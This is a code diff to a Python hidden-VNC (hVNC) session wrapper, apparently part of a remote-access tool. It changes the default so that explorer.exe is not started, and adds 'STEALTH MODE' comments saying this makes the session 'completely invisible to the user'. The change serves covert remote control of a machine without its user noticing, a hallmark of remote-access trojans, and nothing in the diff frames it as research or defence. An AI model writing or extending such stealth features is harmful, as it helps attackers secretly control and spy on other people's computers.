@@ -351,6 +351,10 @@ class HVNCSessionWrapper:
     
     This allows hVNC to be used as a drop-in replacement for the existing
     hidden desktop implementation.
+    
+    STEALTH MODE: By default, explorer.exe is NOT started on the hidden desktop.
+    This makes the HVNC session completely invisible to the user.
+    Applications are launched directly without a shell.
     """
     
     def __init__(
@@ -358,7 +362,7 @@ class HVNCSessionWrapper:
         width: int = 1920,
         height: int = 1080,
         fps: int = 30,
-        start_shell: bool = True,
+        start_shell: bool = False,  # Changed to False for stealth mode
     ):
         """Create hVNC session wrapper.
         
@@ -366,7 +370,7 @@ class HVNCSessionWrapper:
             width: Screen width
             height: Screen height
             fps: Target framerate
-            start_shell: Start explorer automatically
+            start_shell: Start explorer automatically (default False for STEALTH MODE)
         """
         if not HVNC_AVAILABLE:
             raise RuntimeError("hVNC not available on this platform")
@@ -462,12 +466,14 @@ def create_hvnc_session_wrapper(
     width: int = 1920,
     height: int = 1080,
     fps: int = 30,
-    start_shell: bool = True,
+    start_shell: bool = False,  # Changed to False for stealth mode
 ) -> HVNCSessionWrapper:
     """Create hVNC session with compatible interface.
     
     This is a factory function that creates an hVNC session
     with an interface compatible with the existing system.
+    
+    STEALTH MODE: By default, explorer.exe is NOT started.
     """
     return HVNCSessionWrapper(
         width=width,
